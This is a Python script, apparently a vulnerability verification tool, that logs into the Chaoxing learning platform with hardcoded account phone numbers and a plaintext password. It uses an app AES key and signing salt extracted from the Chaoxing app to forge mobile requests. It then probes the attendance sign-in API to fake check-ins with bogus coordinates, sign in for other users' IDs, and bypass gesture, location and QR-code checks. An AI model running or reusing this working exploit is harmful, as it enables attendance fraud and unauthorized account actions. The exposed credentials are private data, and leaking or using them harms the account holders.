import base64, hashlib, json, os, uuid, requests, urllib3, re, time
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
from datetime import datetime

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try:
        s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except:
        pass
    try:
        s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except:
        pass
    return s, puid

def safe_json(r):
    try:
        return r.json()
    except:
        return {"_raw_status": r.status_code, "_raw_text": r.text[:500]}

results = []

def rec(tag, detail, evidence=""):
    results.append({"tag": tag, "detail": detail, "evidence": evidence[:800]})
    vuln = "修改成功" in detail or "success" in evidence.lower()[:100] or "签到成功" in detail
    icon = "🔴" if vuln else "  "
    print(f"  {icon} {tag}: {detail[:200]}")

def run():
    print("=" * 80)
    print(f"V2签到API漏洞验证 - /v2/apis/sign/signIn")
    print(f"时间: {datetime.now():%Y-%m-%d %H:%M:%S}")
    print("=" * 80)

    print("\n[1] 登录账号...")
    s_t, puid_t = login("19712720708", "3.1415926Cpy")
    s_s, puid_s = login("18436633997", "3.1415926Cpy")
    print(f"  教师puid={puid_t}, 学生puid={puid_s}")

    base = "https://mobilelearn.chaoxing.com"

    print("\n[2] 获取签到活动列表...")
    r = s_s.get(f"{base}/ppt/activeAPI/taskactivelist",
                params={"courseId": COURSE_ID, "classId": CLASS_ID, "uid": puid_s}, timeout=20)
    d = safe_json(r)
    active_ids = []
    if isinstance(d, dict) and "activeList" in d:
        for item in d["activeList"]:
            aid = str(item.get("id", ""))
            atype = item.get("activeType", "")
            status = item.get("status", "")
            name = item.get("nameOne", "")
            active_ids.append({"id": aid, "type": str(atype), "status": str(status), "name": name})
    print(f"  找到 {len(active_ids)} 个签到活动")

    print("\n" + "=" * 80)
    print("[3] V2 signIn API - 逐个活动详细测试")
    print("=" * 80)

    for act in active_ids:
        aid = act["id"]
        atype = act["type"]
        status = act["status"]
        name = act["name"]

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        result = d.get("result", "?")
        msg = d.get("msg", "")
        error_msg = d.get("errorMsg", "")
        data = d.get("data", {})

        rec(f"T3-{aid[:8]}", f"V2 signIn aid={aid} type={atype} status={status} name={name}: result={result}, msg={msg}, error={error_msg}, data={json.dumps(data, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])

    print("\n" + "=" * 80)
    print("[4] V2 signIn API - 验证签到状态是否持久化")
    print("=" * 80)

    for act in active_ids[:5]:
        aid = act["id"]
        r = s_s.get(f"{base}/pptSign/stuSignajax",
                    params={"activeId": aid, "uid": puid_s, "clientip": "", "latitude": "-1",
                            "longitude": "-1", "appType": "15", "fid": "0"},
                    timeout=20)
        rec(f"T4-stuSign-{aid[:8]}", f"stuSignajax aid={aid}: {r.text[:100]}", r.text[:300])

    print("\n" + "=" * 80)
    print("[5] V2 signIn API - 不同参数组合测试")
    print("=" * 80)

    test_aid = active_ids[0]["id"] if active_ids else "5000163767353"

    param_combos = [
        {"activeId": test_aid, "uid": puid_s},
        {"activeId": test_aid, "uid": puid_s, "latitude": "39.9042", "longitude": "116.4074"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "0", "longitude": "0"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "address": "test"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "appType": "15"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "fid": "0"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "clientip": ""},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "signStatus": "1"},
        {"activeId": test_aid, "uid": puid_s, "latitude": "-1", "longitude": "-1", "status": "1"},
    ]

    for i, params in enumerate(param_combos):
        r = s_s.get(f"{base}/v2/apis/sign/signIn", params=params, timeout=20)
        d = safe_json(r)
        param_desc = ", ".join(f"{k}={v}" for k, v in params.items() if k != "activeId")
        rec(f"T5-{i:02d}", f"V2 signIn ({param_desc}): result={d.get('result','?')}, msg={d.get('msg','')}, error={d.get('errorMsg','')}", json.dumps(d, ensure_ascii=False)[:300])

    print("\n" + "=" * 80)
    print("[6] V2 signIn API - 教师端验证学生签到状态")
    print("=" * 80)

    for act in active_ids[:5]:
        aid = act["id"]
        r = s_t.get(f"{base}/pptSign/signedResult",
                    params={"activeId": aid, "classId": CLASS_ID, "courseId": COURSE_ID, "uid": puid_t},
                    headers={"Referer": f"{base}/"}, timeout=20)
        if r.status_code == 200:
            try:
                d = r.json()
                rec(f"T6-signed-{aid[:8]}", f"教师 signedResult aid={aid}: {json.dumps(d, ensure_ascii=False)[:200]}", json.dumps(d, ensure_ascii=False)[:500])
            except:
                rec(f"T6-signed-{aid[:8]}", f"教师 signedResult aid={aid}: HTTP {r.status_code}, len={len(r.text)}")
        else:
            rec(f"T6-signed-{aid[:8]}", f"教师 signedResult aid={aid}: HTTP {r.status_code}")

    print("\n" + "=" * 80)
    print("[7] V2 signIn API - 学生尝试为其他学生签到")
    print("=" * 80)

    other_uids = [puid_t, "12345678", "999999999"]
    for uid in other_uids:
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": test_aid, "uid": uid, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        rec(f"T7-uid-{uid[:8]}", f"V2 signIn uid={uid}: result={d.get('result','?')}, msg={d.get('msg','')}, error={d.get('errorMsg','')}", json.dumps(d, ensure_ascii=False)[:300])

    print("\n" + "=" * 80)
    print("[8] V2 signIn API - 不同签到类型的绕过测试")
    print("=" * 80)

    type_tests = {
        "2": "普通签到",
        "3": "手势签到",
        "4": "位置签到",
        "5": "二维码签到",
        "6": "签到码签到",
    }

    for act in active_ids:
        aid = act["id"]
        atype = act["type"]
        name = act["name"]

        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        result = d.get("result", "?")
        error_msg = d.get("errorMsg", "")
        data = d.get("data", {})

        type_name = type_tests.get(atype, f"未知({atype})")
        rec(f"T8-{aid[:8]}", f"[{type_name}] aid={aid}: result={result}, error={error_msg}, data_keys={list(data.keys()) if isinstance(data, dict) else 'N/A'}", json.dumps(d, ensure_ascii=False)[:400])

    print("\n" + "=" * 80)
    print("[9] V2 signIn API - 检查返回的签到记录详情")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        r = s_s.get(f"{base}/v2/apis/sign/signIn",
                    params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                    timeout=20)
        d = safe_json(r)
        if d.get("result") == 1 and isinstance(d.get("data"), dict):
            data = d["data"]
            rec(f"T9-detail-{aid[:8]}", f"签到记录详情: {json.dumps(data, ensure_ascii=False)[:300]}", json.dumps(data, ensure_ascii=False)[:600])
        else:
            rec(f"T9-detail-{aid[:8]}", f"签到记录: result={d.get('result')}, error={d.get('errorMsg','')}")

    print("\n" + "=" * 80)
    print("[10] V2 signIn API - 重复签到测试")
    print("=" * 80)

    for act in active_ids[:3]:
        aid = act["id"]
        for attempt in range(3):
            r = s_s.get(f"{base}/v2/apis/sign/signIn",
                        params={"activeId": aid, "uid": puid_s, "latitude": "-1", "longitude": "-1"},
                        timeout=20)
            d = safe_json(r)
            rec(f"T10-{aid[:8]}-{attempt}", f"重复签到#{attempt+1} aid={aid}: result={d.get('result','?')}, error={d.get('errorMsg','')}", json.dumps(d, ensure_ascii=False)[:300])
            time.sleep(0.5)

    print("\n" + "=" * 80)
    print("[11] 保存结果")
    print("=" * 80)

    report_file = os.path.join(os.path.dirname(os.path.abspath(__file__)), "v2_sign_vuln_results.json")
    with open(report_file, "w", encoding="utf-8") as f:
        json.dump(results, f, ensure_ascii=False, indent=2)
    print(f"  结果已保存到: {report_file}")
    print(f"  共 {len(results)} 项测试")

    success = sum(1 for r in results if '"result":1' in r.get("evidence", "") or "success" in r.get("evidence", "").lower()[:100])
    print(f"  签到成功: {success}")

if __name__ == "__main__":
    run()
